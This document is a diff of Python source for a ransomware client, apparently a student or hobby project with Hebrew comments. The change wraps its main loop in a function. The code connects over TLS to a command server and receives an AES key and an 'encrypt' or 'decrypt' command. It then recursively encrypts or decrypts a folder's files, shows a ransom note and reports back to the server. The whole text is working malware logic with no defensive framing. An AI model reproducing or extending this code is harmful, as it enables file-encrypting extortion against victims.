@@ -96,47 +96,49 @@ def Decryption_all_files_in_folder(folder_path, AES_KEY):
         elif os.path.isdir(full_path):
             Decryption_all_files_in_folder(full_path, AES_KEY)
     
-    
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    with context.wrap_socket(s, server_hostname="anything") as secure_sock:
-        secure_sock.connect((HOST,PORT))
-        
-        while True:
-            aes_key = b""
-            while True: # נקבל את המילה הסודית מהשרת
-                aes_key = aes_key + secure_sock.recv(1024)
-                
-                if aes_key.endswith(b"__END__"):
-                    aes_key = aes_key.removesuffix(b"__END__")
-                    break
-                        
-                        
-            action = ""
+def main(): 
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        with context.wrap_socket(s, server_hostname="anything") as secure_sock:
+            secure_sock.connect((HOST,PORT))
+            
             while True:
-                action = action + secure_sock.recv(1024).decode()
+                aes_key = b""
+                while True: # נקבל את המילה הסודית מהשרת
+                    aes_key = aes_key + secure_sock.recv(1024)
+                    
+                    if aes_key.endswith(b"__END__"):
+                        aes_key = aes_key.removesuffix(b"__END__")
+                        break
+                            
+                            
+                action = ""
+                while True:
+                    action = action + secure_sock.recv(1024).decode()
+                    
+                    if action.endswith("__END__"):
+                        action = action.removesuffix("__END__")
+                        break
                 
-                if action.endswith("__END__"):
-                    action = action.removesuffix("__END__")
-                    break
-            
-            if action == "encrypt":
+                if action == "encrypt":
+                    
+                    Encryption_all_files_in_folder(folder, aes_key)
+                    
+                    del aes_key
+                    show_ransom_note_encryption()
+                    
+                    secure_sock.sendall(b"the files are encrypted")
+                    secure_sock.sendall(b"__END__")
                 
-                Encryption_all_files_in_folder(folder, aes_key)
+                elif action == "decrypt":
+                    
+                    Decryption_all_files_in_folder(folder, aes_key)
+                    del aes_key
+                    show_ransom_note_decryption()
+                    
+                    secure_sock.sendall(b"the files are decrypted")
+                    secure_sock.sendall(b"__END__")
                 
-                del aes_key
-                show_ransom_note_encryption()
                 
-                secure_sock.sendall(b"the files are encrypted")
-                secure_sock.sendall(b"__END__")
-            
-            elif action == "decrypt":
-                
-                Decryption_all_files_in_folder(folder, aes_key)
-                del aes_key
-                show_ransom_note_decryption()
-                
-                secure_sock.sendall(b"the files are decrypted")
-                secure_sock.sendall(b"__END__")
-            
-            
-            sys.exit()
+                sys.exit()
+if __name__ == "__main__":
+    main()
